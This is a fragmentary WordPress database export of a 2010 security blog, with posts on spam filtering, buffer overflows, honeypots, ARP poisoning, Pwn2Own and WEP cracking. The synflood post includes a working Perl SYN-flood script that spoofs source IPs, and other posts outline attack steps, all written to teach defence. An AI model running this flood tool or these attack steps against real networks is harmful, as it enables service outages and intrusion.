04:29:41','spamassassin-milter-vulnerability','0','','publish','Spamassassin Milter vulnerability','post',''),(

I\'m sure that other sporting events are just as popular with the scammers and crooks. If you want to check out the fun, put this into your browser:\nhttp://www.google.com/search?q=big+ten+tournament+2010+wiki\nWe trust that you are not crazy enough to click on the links that Google marks as hazardous to your computer\'s health, but if you do and you net something really cool that you\'d like to analyze, please let us know what you uncover. Use the comment feature below or send us a note via our contact form.\nThanks Melvin for the info!\n\n<!--more-->\n\nUPDATE 1\nOne of our readers took the challenge and tried clicking through the Google warnings to see what happened. According to Richard (and Melvin pointed this out to us in his original note) clicking on a link that Google marks as hazardous will not lead you to the exploited site. Instead, you have to copy/paste the evil URL but when you do that you remove the referring site (Google) from the URLand the exploit won\'t work. In this case, some of the site redirect to www.cnn.com. Others give you a 404 error. Some browsers will also alert you to the impending doom if you have certain helper plug-ins installed. However, some of the infected sites have not been flagged by Google. Richard followed a few of these and sent us these notes:\n\nMany of these redirect to a .in server to dish up a rogue AV exploit:\n\nhttp://www.urs2.net/rsj/computing/imgs/rogue_1.gif\n\nThe trojan executable starts to cache while the usual popup messages begin to appear along with the fake scan.\n\nhttp://www.urs2.net/rsj/computing/imgs/rogue_2.gif\n\nBut these are not remote code execution exploits, for at some point the download prompt box appears, requiring a click.\n\nhttp://www.urs2.net/rsj/computing/imgs/rogue_4.gif\n\nYou cannot X out of the page with the mouse, but ALT + F4 works, and of course, closing the Process in Task Manager.\n\nThese same exploits are also served up if you search for Holly Graf.\n\nI downloaded one of the binaries earlier today from a Holly Graf it had already been analyzed at Virus Total:\n\nhttp://www.virustotal.com/analisis/34041381efe99d23fe716de431e464aea0b7d1fc6b2fd7d09baf1ddde603c160-1268542205\n\nThanks Richard for sacrificing your computer and providing the additional analysis. :)\nMarcus H.

This means, how do I prevent it from actually ever winding up in the users inbox.\n\nDealing with spam is kind of a game of cat and mouse.  You\'ll impliment the latest and greatest anti-spam filter and a few days later, the spammers will have found a technique to bypass it.  The only way to truly erradicate spam is to think ahead and not craft filters based on todays spam recipe.\n\nWhat I\'ve implemented is a series of filters that rely upon internet standards set forth in various RFC\'s that true mail servers should adhere to.  Most mail servers used by spammers are not configured properly, and we rely on this to do our filtering.\n\n<!--more-->\n\nThe first layer of filtering I use filters out zombie hosts.  A zombie host is essentially a host that is being controlled by a virus, worm, or malware.  This filter does a few things.\n<ol>\n	<li>It delays the SMTP greet message.  When a zombie host tries to send an email, their patience is limited and they time out quickly.  By delaying the greet message, the zombie host doesn\'t know for sure that this is a valid SMTP service and gives up</li>\n	<li>It checks the IP address of the sender against a known zombie host blacklist</li>\n	<li>It checks for a bogus \"helo\" statement</li>\n	<li>It looks for harmful content - ie, file extensions of .exe, .vbs, .com, etc etc etc.</li>\n</ol>\nThese steps eliminate a good chunk of spam.\n\nThe second layer that I use is called \'greylisting\'.  This is an incredibly effective method that temporarily blocks an email for a set amount of time (1 minute is sufficient) and issues a 451 message to the sending mail server indicating that the mailbox that its trying to send email to is temporarily busy and to try again.  At this point, the sending mail server says, \"Okay.. I\'ll try again\" and waits for a few minutes before attempting to resend.  Its second attempt, so long as it\'s waited for longer than a minute, will go through and get passed to the next phase of filtering.\n\nThis is effective because, again, most spammers are not using legitimate email servers and do not follow the SMTP protocol.  So, when they receive the 451 message, they give up immediately and move on to the next email address in their spam list.  This filter, alone, blocks over 50% of spam.\n\nThe next layer that I use is called \"Mimedefang\".  Mimedefang is a milter that allows you to manipulate incoming emails using Perl.  This gives an administrator incredible power to quickly impliment new filters based on spam that they\'re receiving.  I\'ll talk more on this in a minute, because its my absolute favorite filtering tool.\n\nThe last layer that an email must make it through before being delivered to one of my users is \"MailScanner\".  MailScanner is a tool that is responsible for sanity checking emails, virus scanning, checking emails against RBL\'s, and many other filtering options.  This is my last layer because it utilizes more resources than the previous filters and generally the email that makes it this far is legitimate and 80% of the spam has already been blocked.  MailScanner will kill off the next 15% of spam/viruses.. allowing the 5% of legitimate emails to actually make it through.\n\nI\'m going to go a little more into depth on Mimedefang..\n\nI use Perl heavily in my day to day administration tasks, so I can write in Perl as fluently as I can write in English.  This makes Mimedefang my favorite toy when it comes to the war on spam.  In my mimedefang-filter file, I have a bunch of hooks set up to check for spoofed IP\'s, countries of origin, legitimate users, and scan within emails for specific, known issues, using regular expressions to match keywords.\n\nBecause we rarely get emails from outside of the US and a few other countries, it made more sense for me to ban all countries sending email to us and then whitelist the few countries that we legitimately recieve email from.  On an ISP scale, this wont work for obvious reasons, but for smaller networks, this is incredbily effective and simple to implement.\n\n<pre>\nsub country() {\n     my $ip = shift;\n     my $gi = Geo::IP-&gt;new(GEOIP_STANDARD);\n     $country = $gi-&gt;country_name_by_name(\"$ip\");\n     $return($country);\n}\n</pre>\n\nThis function now returns the name of a country when it\'s passed an IP address.  I call it from within the filter_begin() routine and do something like this:\n\n<pre>\nif(/^=.*?[(d+.d+.d+.d+)].*/) {\n     $ip = $1;\n     if($ip =~ /192.168.0.*/) { last; } # don\'t want to block emails coming from the LAN\n     $co = &amp;country($ip);\n     if($co =~ /United States/) {\n          md_syslog(\'warning\', \"coip-ip - $ip - $co\");\n          next;\n     } else {\n          foreach $recip (@Recipients) {\n          delete_recipient($recip);\n     }\n     add_recipient(\'spam@localhost\');\n     action_change_header(\'Subject\', \"COIP - $co - $subject\");\n     md_syslog(\'warning\', \"coip-ip - $ip - $co - BANNED\");\n}\n</pre>\n\nSimple.\n\nThere are a ton of other filters I have built in to mimdefang, so if you\'re interested in discussing it further, let me know.  But to really give you the idea of the power of this filter, here\'s a regular expression to match swear words, even when they\'re intentionally misspelled, ie - sh!t, sh*t, sh1t, etc.\n\n<pre>\nif(/b(s[h!|@-*][i!|@-*][t!|@-*]){1,3}(s+|$)/i ||\n   /b(f[u!|@-*][c!|@-*][k!|@-*]){1,3}(s+|$)/i ||\n   /b(a[s!|@-*$][s!|@-*$]){1,2}(s+|$)/i ||\n   /b(w[h!|@-*][o!|@-*0][r!|@-*][e!|@-*]){1,4}(s+|$)/i ||\n   /b(b[i!|@-*][t!|@-*07][c!|@-*][h!|@-*]){1,4}(s+|$)/i ||\n   /b(s[l!|@-*$][u!|@-*$][t!|@-*7]){1,3}(s+|$)/i ||\n   /b(c[u!|@-*$][n!|@-*$][t!|@-*7]){1,3}(s+|$)/i) {\n       add_recipient(\'spam@localhost\');\n}\n</pre>\n\nPonder that for a moment.. ;-)','','2010-03-18 14:49:38','2010-03-18 19:49:38','','','2010-03-18 14:49:38','2010-03-18 19:49:38','handling-spam-at-the-network-level','0','','publish','Handling Spam at the Network Level','post','');

I think the second most frequent has got to be regarding how hacking actually <em>works</em>.\n\nSo, I\'m sitting here on my patio in the beautiful sun throwing the frisbee for my dog and decided what a perfect time to go in to a little detail about the science behind a \"hack\".\n\nThere are two forms of a \"hack\".  Originally, a \"hack\" referred to manipulating something to get it to do something it wasn\'t intended to.  This was a more innocent time, when it was more about ingenuity and thinking outside the box to pull pranks and impress your professor.\n<!--more-->\n\nToday\'s version of hacking follows the same concept, but the desired outcome is a bit different.  Rather than figuring out a way to hack a vending machine to give up it\'s goods for free, today the idea is to exploit flaws in software in an attempt to escalate privileges.  To understand how this is accomplished, you need to understand operating systems and permissions.  I\'ll be using Linux as the example, but it applies to any multiuser operating system out there.\n\nIn the Linux world, the administrative account is named \"root\".  A hackers goal, ultimately, is to become root on a system that he or she doesn\'t have, or has limited access to.  There are a number of ways to accomplish this, but generally the method used is called \"stack smashing\", also known as a \"buffer overflow.\"  There are about a million other ways, but stack smashing is one of the originals.\n\nThere was a document written long, long ago by a guy named AlephOne called \"<a href=\"http://www.google.com/url?sa=t&source=web&ct=res&cd=1&ved=0CAcQFjAA&url=http%3A%2F%2Finst.eecs.berkeley.edu%2F~cs161%2Ffa08%2Fpapers%2Fstack_smashing.pdf&rct=j&q=smashing+the+stack+for+fun+and+profit+pdf&ei=LY6jS-eQLouVtgfW_7SOCg&usg=AFQjCNGFLW6iO9Sw1l38x6D8Bry_U75DXA\">Smashing the Stack for Fun and Profit</a>.\"  That document goes into far more detail than what I\'ll get into here, but if this at all interests you, I highly recommend reading that.\n\nLets take a simple C program that takes user input and copies it into a buffer.\n\n<pre>\n#include <stdio.h>\nmain() {\n     char buf[10];\n     printf(\"Enter your name: \");\n     gets(buf);\n}\n</pre>\n\nSo, running this will simply ask for your name and the supplied string is copied into \'buf\', which has been defined to allocate 10 bytes of data specifically to hold the whatever it is that is entered.  No big deal.\n\nLets say, though, that the user has a name that\'s 20 characters long.  Given that the program has only allocated 10 bytes of memory space, we run into a problem.  This is called a \"buffer overflow\", because the data has overflowed the bounds of the buffer.  Here\'s what that looks like:\n\n<blockquote>\n<pre>\n$ ./vulnerable\nEnter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nSegmentation fault\n</pre>\n</blockquote>\n\nAs you can see, the program crashed.  When run through a debugger, you can analyse the memory addresses that are being overwritten by the additional data.  Specifically, you\'re looking for the instruction \"RET\" to be overwritten with 0x41414141 (a string of A\'s).  If you\'re able to overwrite RET, you can then change the return address of a function to point to an address outside of the process space to execute arbitrary code.\n\nNow, lets say that the program that is vulnerable to this style of attack is suid root, meaning, that the program has root privileges when its run because it needs access to something that only root would have access to.  Files, directories, sockets, etc.\n\nAfter the overflow takes place, the arbitrary code that is injected will be a set of instructions to do one of the following (in most cases).  Again, these instructions will be executed as \'root\'.\n \n	<li>Copy /bin/sh somewhere and set the suid bit</li>\n<li>Copy /bin/sh somewhere and set the suid bit and bind it to a port for remote access</li>\n\nThen, when the attacker executes /bin/sh, he will now be operating within a root shell and will have become the super user, having complete and utter control over the system to do whatever he pleases.\n\nToday\'s Unix based systems have implemented better libraries to help prevent this style of attack by randomizing the memory addresses that are being used when a program is executed, making it more difficult to determine the needed memory addresses used to pull off this style of attack, and also makes it necessary to write code for individual systems.  However, there are ways of bypassing these measures and someone determined enough will figure it out.  Though, because of these security measures, the script kids have gone on to other types of \"hacks\", if you can even call them that.\n\nThe entire problem with stack smashing spawned from really, really bad code being written.  What fueled this problem was that the bad code made it into college text books, which were then taught to the next generation of programmers.  There are a number of C functions which were vulnerable to buffer overflow attacks, because they didn\'t incorporate bounds checking.  IE - lets make sure the buffer is large enough to hold the amount of data that we\'re about to send it.  New functions that DID incorporate bounds checking were introduced long after this problem was running rampant, but even without these new functions, writing secure code was only a matter of coming up with an additional line of code and manually doing the bounds checking by incorporating <code>sizeof()</code> before passing user supplied data to a buffer.\n\nThis has really been a simplified version of the whole buffer overflow science, but if you\'re interested in how this works and how it\'s been used, there are many resources on the interwebz describing it.\n\n','','2010-03-19 10:24:42','2010-03-19 15:24:42','','','2010-03-19 10:24:42','2010-03-19 15:24:42','a-stack-smashing-good-time','0','','publish','A Stack Smashing Good Time','post',''),(
'46','1','open','http://www.interwebz.us/wordpress/?p=46','0','open','','2','I monitor my network heavily, probably beyond what is necessary, and I like to see what\'s going on behind the scenes.  I have sniffers set up, iptable logging, snort, etc etc etc.. but those only watch ports that are open that I\'m expecting to receive data on.  But, what I find interesting, is everything <i>else</i> that is being sent in and out of my network.\n\nSo, I run tcpdump on both the internal and external interface of my firewall.  This is done simply by:\n<!--more-->\n<blockquote>\ntcpdump -i eth0 -n -w tcpdump.eth0.3.19.2010.log \'tcp[13] & 2 != 0\'\n</blockquote>\nand\n<blockquote>\ntcpdump -i eth1 -n -w tcpdump.eth1.3.19.2010.log \'tcp[13] & 2 != 0\'\n</blockquote>\n\nThis simply monitors both interfaces for SYN packets, because I don\'t really want, or need, any other packets because my firewall wont respond to any packets sent to ports that are closed.\n\nThen, to find out what type of activity is going on beyond that of what I\'m expecting so see, I\'ll run something like this:\n\n<blockquote>\nfirewall# tcpdump -n -r tcpdump.eth1.3.19.2010.log \'tcp[13] & 2 != 0\' and not src net my.ip.add.ress and not src port 8200 and not src port 443 and not src port 445 and not src port 25 and not src port 80|perl -le \'sub order(){$p{$b}<=>$p{$a};}while(<STDIN>){if(/^.*?my.ip.add.ress.(d+).*/){$p{$1}++;}}foreach $port(sort order(keys(%p))){print \"$port - hits: $p{$port}\";}\'|more\n\nreading from file tcpdump.eth1.3.19.2010.log, link-type EN10MB (Ethernet)\ntcpdump: pcap_loop: truncated dump file; tried to read 62 captured bytes, only got 20\n25 - hits: 865\n10392 - hits: 73\n445 - hits: 69\n53 - hits: 61\n135 - hits: 47\n22 - hits: 28\n5900 - hits: 17\n3246 - hits: 16\n.......\n</blockquote>\n\nWhat this tells me is each port that is being hit and how many times.  Port 25 is a given, I run a mail server.. but port 10392 is interesting.  Investigating further, it shows me that all the sources hitting this port are Japanese.  Neat.  Also, there doesn\'t seem to be any information on the internet about what this port is, does, anything.. so, we\'ll have to figure it out on our own.\n\nSo, now what I want to know, is what, exactly, they\'re trying to accomplish by connecting to that port.  This is where a honeypot comes in handy.  It doesn\'t have to be anything too elaborate, because I don\'t really want to interact with them, I just want to understand what they\'re trying to connect to, so \'netcat\' will be all that I need.\n\nIn my firewall, I add the following line:\n\n<blockquote>\niptables -A INPUT -p tcp -i eth1 -d 0/0 -s 0/0 --destination-port 10392 -j accepted\n</blockquote>\n\nIf you want to redirect traffic to a different box, you can do something like this:\n\n<blockquote>\niptables -t nat -A PREROUTING -p tcp -i eth1 --dport 10392 -j DNAT --to 192.168.0.x:10392 -m comment --comment \"HoneyPot\"\niptables -A FORWARD -p tcp -i eth1 -d 192.168.0.x --destination-port 10392 -j accepted -m comment --comment \"HoneyPot\"\niptables -A FORWARD -p tcp -i eth0 -s 192.168.0.x --source-port 10392 -j accepted -m comment --comment \"HoneyPot\"\n</blockquote>\n\nOnce you have iptables set up, you\'ll need to run netcat to listen on port 10392.  Here\'s the command line that I use:\n\n<blockquote>\nperl -le \'while($i <= \"100\") { system(\"nc -l -v -p 10392\"); $i++; }\' &> nc-10392.log&\n</blockquote>\n\nThis takes 100 samples and then exits, because I doubt I\'ll need any more than 100 samples to understand what exactly is going on.  In reality, I probably really only need 2 or 3, but, whatever.  You have to do it this way because netcat exists after a successful connect, so you need to reinvoke it.\n\nOn a side note, the \'-k\' supposedly sets the keep-alive option on the socket, but it doesn\'t seem to work.. so.\n\nAnd, now you wait.  And wait.. and wait some more.  It seems that as soon as you run something like this, all interest is lost in the port and you have to wait for days before you see any activity on it again, which is why I\'m not going to tell you what I found going on with this port just yet.  ;-)\n\nAs soon as I find out, I\'ll be posting an update.  If it\'s interesting enough, I\'ll also be posting it to SANS ISC.\n\nBecause I\'m sure most of you find that absurdly long command line that I pasted above to be a bit confusing, I wrote a simple script to accomplish the same thing, but in an easier to read format.\n\n<pre lang=\"perl\" line=\"1\">\n#!/usr/bin/perl\nuse Socket;\n\n# The following 3 lines should actually be just 1.

Tonight I was going through some of my old scripts and came across one of my old favourites, \'synk\'.\n\nI\'ve written synk in a few different languages, with various different versions, but all based on the same concept.  TCP+SYN flooding.  Some versions had random source IP\'s set per packet, others had singular spoofed source IP, others used random ports, port ranges, random tcp flags set, offsets, etc etc etc, but always the most effective one was the one that used random source IP\'s set per packet, hitting a range of destination ports.\n<!--more-->\nI decided to play with it again tonight to slam my network (hard) and, to my surprise, it still works as effectively as it once did.  I really couldn\'t believe it.  Especially against the firewall that I have set up, I never expected it to do anything.\n\nWell, I was wrong.  I typed in the command and boom, service went down almost as fast as I hit \"enter\".  Even a robust service, like Sendmail.  This was a little upsetting, because I even had a rule in my firewall to block syn floods.  I also have syn-cookies enabled on the server running Sendmail.\n\nI started digging and doing some research on A) why my rule didn\'t work properly, and B) how to write a rule that would.  I came across a lot of blog entries and forums all listing a rule similar to what I had, so I\'m guessing these people have never tested their rule properly.\n\nHere\'s the code that I used to carry out the attack.  Keep in mind, this was written years and years ago.\n\n<pre>\n#!/usr/bin/perl\n\nrequire \'getopts.pl\';\n\n### need to utilize raw sockets.\nuse Net::RawIP;\nGetopts(\'s:t:p:n:\');\n\n\n### function to create random IP\'s.

That said... you could tweak\n### this to only use IP\'s from the /24 that your IP resides in and stand a \n### better chance of the spoofed packet making it through.  It depends \n### on how the filtering is set up at your ISP.\nsub randip () {\n  $ip = join(\".\", map int rand 256, 1 .. 4);\n  return(\"$ip\");\n}\n\n### set up the socket.\n$syn = new Net::RawIP;\n\ndie \"Usage: $0 -s <source ip> -t <target> -p <port> -n <number of packets>n\"\nunless ($opt_s && $opt_t && $opt_p && $opt_n);\n\n### allow the user to specify a list of comma separated ports via the command line.\n@ports = split(/,/, $opt_p);\n$list = @ports;\n\n### super awesome output.\nprint \"Hitting $opt_t on port(s) @ports with $opt_n packets originating from $opt_s....n\";\n\n### start the loop\nfor($i = 1;$i < $opt_n;$i++) {\n  ### randomly select a port out of the @ports array\n  $nlist = int rand($list);\n  $dport = $ports[$nlist];\n\n  ### Souce ports must be random\n  $rport = int rand(65535);\n\n  ### set up the packet.. \n  $syn->set({\n      ip => {\n             daddr => $opt_t,\n             saddr => $opt_s,\n            },\n\n  ### specify the destination port and source port.. make sure the syn flag is enabled.\n      tcp => {\n              dest => $dport,\n              source => $rport,\n              ack => 0,\n              urg => 0,\n              rst => 0,\n              fin => 0,\n              psh => 0,\n              syn => 1 \n             }\n      });\n  ### send the packet! yay!      \n      $syn->send;\n}\n</pre>\n\nSeems too simple to believe that code similar to that once took down Yahoo, eTrade, and many other huge internet companies.\n\nMy original iptables rule for handling synfloods looked like this:\n\n<blockquote>\n<pre>\niptables -A INPUT -m state --state NEW -p tcp -m tcp --syn -m recent  \n              --name synflood --set\niptables -A INPUT -m state --state NEW -p tcp -m tcp --syn -m recent \n              --name synflood --update --seconds 5 --hitcount 10 -j synflood \n              -m comment --comment \"Synflood\"\niptables -A FORWARD -m state --state NEW -p tcp -m tcp --syn -m recent \n              --name synflood --set\niptables -A FORWARD -m state --state NEW -p tcp -m tcp --syn -m recent\n               --name synflood --update --seconds 5 --hitcount 10 -j synflood \n               -m comment --comment \"Synflood\"\n</pre>\n</blockquote>\n\nHere\'s the new rule I came up with that <i>DOES</i> work.  It also has the additional benefit of limiting how many connections a single IP can have to a service, which is effective for those SSH brute force worms and various other internet annoyances.  I would be a little more liberal on the amount of connections when using it to protect an HTTP service, though.  I would probably change <code>connlimit-above 3</code> to something like, <code>connlimit-above 8</code>, as clients generally make more than 3 connections to a server when requesting a web page.\n\n<blockquote>\n<pre>\niptables -A FORWARD -p tcp --syn --dport 25 -m connlimit --connlimit-above 3 \n              --connlimit-mask 24 -j synflood -m comment --comment \"SMTP Synflood Protection\"\n</pre>\n</blockquote>\n\nThe other beautiful thing about this rule, is that it limits the entire class C, and it\'s not permanent.  So, if one disconnects, it\'s immediately available for another connection from that netblock.\n\nThere is, however, one caveat that I\'m not sure if there\'s a way to protect against, and that\'s the random source IP\'s set on a per packet basis.  \n\nIE, packet one may come from 1.2.3.4 and packet two could be from 72.72.72.72 and packet three could be from 81.81.81.81, and so on, times millions of packets.  \n\nThere is a way to write a rule to monitor the flow of syn packets and recognize a synflood, but then it kind of defeats the purpose because it shuts down access to the port for everyone, which is essentially the desired outcome of the attacker in the first place.  The system being attacked wont suffer from the CPU overhead of a synflood, and recovery will be quicker, but so long as the attack is taking place, the services are unavailable.  Anyone care to comment on this?\n','','2010-03-21 04:05:11','2010-03-21 09:05:11','','','2010-03-21 04:05:11','2010-03-21 09:05:11','synflooding-and-iptables','0','','publish','Synflooding and iptables','post','');

They range in complexity, but in simplest of terms, a MiM attack is one where the attacker convinces the network that he is the gateway, forcing network traffic to be routed through his machine before leaving the network, thus allowing him to sniff all the data flowing in and out of the network.  Needless to say, you don\'t want this to happen to you.\n\nThe one piece of this attack that makes it more difficult for an attacker is that he needs to already be on your network in some fashion.  Whether he hacked a box, or got in through a backdoor, or worm, or.. whatever.. he first needs to gain some sort of access to your network in order to be able to pull this off.  That said, it\'s not that difficult to gain access enough to pull off a MiM attack.\n\nSo, step one for an attacker is to gain access.  Lets say that he got in by crafting a PDF and sending it to an employee who opened it.  Lets say the payload of this PDF was one that utilized the VNC.DLL, allowing remote access.  I picked on PDF because it seems that there are just far too many vulnerabilities in Adobe Reader as of late.\n\nOk, so the attacker now has remote access to one of your companies workstations.  He connects after hours and essentially takes over this machine while everyone from the office is at home sleeping.  He begins poking and prodding around the network and determines that penetrating the servers is easier said than done.  Enter, ARP poisoning.\n\nHe opens up the web browser on this newly compromised machine and downloads \"Cain & Abel\", which is a \"password recovery tool\".  This tool has the ability to sniff network packets and poison arp tables.  Not exactly sure how this helps in password recovery, but...\n\nAfter installing Cain & Abel, he begins broadcasting packets to the network that look like this:  \n\n10.0.0.1 = gateway router\n10.0.0.10 = compromised machine that attacker is controlling with Cain & Abel\n\n<blockquote>\n<pre>\n13:41:46.243899 arp who-has 10.0.0.1 tell 10.0.0.10\n13:41:46.243918 arp reply 10.0.0.1 is-at 00:AA:AA:AA:AA:AA\n</pre>\n</blockquote>\n\nOk, so now he knows that the router resides at 00:AA:AA:AA:AA:AA.  Lets say the the compromised machine has the mac address of 00:BB:BB:BB:BB:BB.  Cain & Abel will then begin injecting unicast packets that looks something like this:\n\nThis time, 10.0.0.1 = gateway and 10.0.0.55 = coworker\n\n<blockquote>\n<pre>\n13:41:51.101101 arp who-has 10.0.0.1 tell 10.0.0.55\n13:41:51.241002 arp reply 10.0.0.1 is-at 00:BB:BB:BB:BB:BB\n13:41:51.301101 arp who-has 10.0.0.55 tell 10.0.0.1\n13:41:51.401101 arp reply 10.0.0.55 is-at 00:BB:BB:BB:BB:BB\n</pre>\n</blockquote>\n\nSo, what just took place is he told 10.0.0.55 that the router (10.0.0.1) is located at 00:BB:BB.... and then told the router that 10.0.0.55 is located at 00:BB:BB.  Cain & Abel will set up a quick and dirty routing table, allowing this to be transparent to everyone on the network and is now officially acting as the network gateway for 10.0.0.55.  Any data to or from this computer first goes through the compromised machine.  And, since Cain & Abel is a \"password recovery tool\", it will sniff the network flow for anything similar to \"user\" and \"password\" and log anything matching.\n\nCain & Abel will do this for every box on the network, forcing all data in and out of the network to first go through this machine.  This network is now, most definitely, \"owned.\"  Especially when the sysadmin gets into the office in the morning and logs in to his machine, and then into the firewall, and mail server, and NAS, and every other major service box on the network.  Every username and password that he sends will be logged.  Lets hope that he decides that the website needs some updating today.  Having his username and password to the FTP server for the website would be pretty sweet.\n\nEXCEPTIONS: If the sysadmin uses SSH (which he should be!) to log in to these machines, the traffic will be encrypted and wont be deciphered.  However, since the network is already compromised, sniffing the user/password that he\'s using to mount file shares will be trivial, and because of his role at the company, he\'s probably got elevated privileges.\n\nOnce a MiM attack is successful, you are in a really, really bad spot.  The level of compromise is severe, as it\'s not isolated to one machine, it\'s network wide.  You do not want to be in this situation.  Ever.\n\nThere are countless tools available on the internet to pull off a MiM attack.  And, no, if you\'ve heard that by having a switched network that you\'re protected from this, you\'re sadly mistaken.  It was easier back in the day on non-switched networks, because you only had to poison one table.  Now with switched networks, you have to poison each machine you want to sniff.  Big whoop, this is why God created for() loops.\n\nNow, you may be thinking \"Yeah, but I don\'t let my users run Adobe, or IE, or Firefox, or Office, or any software at all on their machines.. our network is impenetrable\".  Well, besides having the most unproductive office ever, what about that 802.11 AP that you have set up in the conference room so that when there are meetings, people can bring their laptops and have internet/network access without having to run wires everywhere?  Oh  you\'re using WEP++SUPERDUPERPSK++DEFCON5 to protect your wireless?  You might want to Google for, like, \'aircrack-ng\'.\n\nThere are tons of vulnerabilities surrounding wireless.  Wireless has no place on a corporate network and using this attack method, the attacker doesn\'t even need to compromise a machine.. just the WEP key.  Once compromised, he can inject packets all day long using his own computer.  Ponder that for a minute, and then think about your local coffee shop, or whatever other hotspot you use.  No need to even compromise the wireless network in that situation.. just sit down, order an espresso and poison the crap out of the network, forcing all of the other customers to send their data to you.\n\nTo those out there who are immediately going to run out and attempt this hack... keep in mind that you are not invisible and you can be traced.  I am not going to get into how, or how to avoid being traced, though, because that\'s not really the point of this post.  Just know that it\'s easy to locate the attacker by using his mac address.  \"Lets see, it\'s a Dell card.. there are 2 people here using Dell\'s.. one is a 78 year old woman looking up recipes.. the other is a 17 year old kid who has a tshirt that says, \"I read your email\".  Hmm....\"\n\nOk, so, I think you get the idea.. this is a dangerous, dangerous, often overlooked attack vector.  Most admins know that it exists, but don\'t realise to what extent it\'s capable, or how to protect against it.\n','','2010-03-23 14:17:30','2010-03-23 19:17:30','','','2010-03-23 14:17:30','2010-03-23 19:17:30','arp-poisoning-and-man-in-the-middle-attacks','0','','publish','ARP Poisoning and Man in the Middle Attacks [part 1]','post',''),(

Wifi hacking/WEP cracking).  Every year, the bar definitely gets raised and the people contending definitely have their work cut out for them.  In fact, I\'m usually blown away by the people who attend this event.  From what I can tell, they\'re in the upper echelons of the security world.\n<!--more-->\nToday was the first day of the conference and the three major browsers fell.  Internet Explorer 8, Firefox, and Safari.  Google Chrome remains standing, because no one chose to target that browser.  Chalk up another victory to Google.\n\nThe exploitation of IE8 is rather substantial, as it was IE8 running on Windows 7, which, according to Microsoft, has been built around the concept of security.  It\'s also the 3rd version of Windows to utilise \"DEP\" (Data Execution Protection).  DEP is essentially sandbox in which all software runs.  So, to effectively exploit IE8, not only do you need to exploit the browser itself, you also need to find your way out of the sandbox.  This is easier said than done.\n\nFirefox was also pwned on the Windows 7 platform.  It will be interesting to see if both hackers used the same tricks to escape DEP.  Unfortunately, because like, every big technology company known to man is a sponsor of this event, the contestants are under strict rules to not give out any information on the vulnerability/exploit they used to compromise the target.  I\'m not sure how long this vow of silence is supposed to last, but I\'ve seen exploits released into the wild very shortly after Pwn2Own, so.. we\'ll see!\n\nThe other browser that went down was Safari.  Interestingly enough, Charlie Miller once again targeted Apple and showed that Mac is more easily pwnable than Windows.  Charlie Miller is responsible for the exploitation of more than 20 vulnerabilities in Apple software.  This ranges from the iPhone, to Adobe.  He claims that Mac is far more easy to exploit because of its lack of security features such as DEP and ASLR (address space layout randomization).\n\nI find this a little interesting because Mac OSX was built on top of a really solid foundation, FreeBSD, NetBSD, and various other components from various other unices.  I guess, though, it\'s foundation came to be before PaX (Linux\'s version of ASLR - built before ASLR.  So, there.) was common.  I\'m pretty confident in saying, though, after today, that the next Mac OS released will have some form of DEP, ASLR, PaX, etc.\n\nNow, about Google Chrome.  I love Google, I really, truly, do.  I\'m one of the biggest Google fan boys there are, but they\'re not perfect, so to assume that they weren\'t pwned today doesn\'t mean they wont be.  \n\nGoogle Chrome has additional security features beyond that of DEP and ASLR that make it more difficult to exploit.  Granted.  However, targeting a browser which has minimal market share doesn\'t make much sense.  If 1% of your website visitors are using Chrome, and the other 99% are using a mixture of Safari, Firefox, and IE.. well, guess which browsers are going to be targeted?\n\nThat said, because it\'s not being targeted, as of yet, maybe that gives enough reason to switch over to it.  ;-)\n\nTo be honest, based on the results, your best bet for web browsing security, is a tightly secured Linux box running Google Chrome.  Plus, that set up is free.  Hmm, more secure, and free.  How can you go wrong?\n\nSorry, I\'m a Linux fan boy as well.\n\n','','2010-03-25 12:47:11','2010-03-25 17:47:11','','','2010-03-25 12:47:11','2010-03-25 17:47:11','pwn2own-lesson-learned-dont-browse-the-web','0','','publish','Pwn2Own lesson learned - Don\'t browse the web.','post',''),(
'69','0','open','http://www.interwebz.us/wordpress/?p=69','0','open','','2','Well, we\'re on to part two.  For part two of this post, I\'d like to talk about wireless vulnerabilities and how the Man in the Middle (MitM from now on) attack comes in to play on a wireless network.\n\nMost of us have, or have used, a wireless network.  There are, essentially, two different types.  Those that are wide open, available for anyone to connect to, and those that are not wide open and that use some type of encryption and require a key to connect.\n\nI\'m not going to really cover the wide open networks, because absolutely no compromise needs to take place in order to do MitM and you simply shouldn\'t run one.  \'Nuff said.  If you don\'t know how to secure yours, or don\'t know if yours is open or secured, visit your wireless router manufacturer\'s website for instructions on enabling encryption (WEP, WPA, etc.)  But, before you do that, continue reading, as it will help you choose which version of encryption you enable.\n<!--more-->\nHere is a chart to show the seriousness of this issue.\n\nThis chart shows the breakdown of the different types of wireless networks that I found on my latest war drive.  I was able to find 3,000 networks in about 30 minutes.  If you don\'t know what war driving is, click <a href=\"http://en.wikipedia.org/wiki/Wardriving\">here</a>\n\n<a href=\"http://www.interwebz.us/pics/piechart2.jpg\"><img src=\"http://www.interwebz.us/pics/piechart2.jpg\"></a>\n\nThat chart should frighten you, because there\'s a REALLY good chance that you aren\'t one of the machines in the green.\n\nEssentially, about 70% of the networks that I found were hackable.\n\nSo, now that we know that there\'s no shortage of available networks, lets discuss the attacks against these.\n\nAny machines using a network in the blue are wide open to compromise.\n\nAny machines using a network in the yellow or orange are hackable, and the networks in the green are either very difficult to compromise, or there is no known exploits to compromise this type of network.\n\nThe networks in orange are secured by WEP, and those in yellow utilize WPA+TKIP or PSK.  We\'ll start with WEP.\n\nEach packet transmitted across a WEP secured network contains a 3 byte IV (Initialization Vector) as part of each packet.  In simple terms, this IV is a part of the key used to secure the wireless network.  So, if we collect enough packets, it\'s possible to assemble these IV\'s into something we can crack and get the key.\n\nIn order to collect IV\'s, though, we need traffic.  If someone isn\'t using the wireless network, there wont be much traffic so we have to generate traffic.  There are a number of ways to do this.. the easiest way is to associate with the access point and send ARP requests.  The AP will broadcast responses, thus 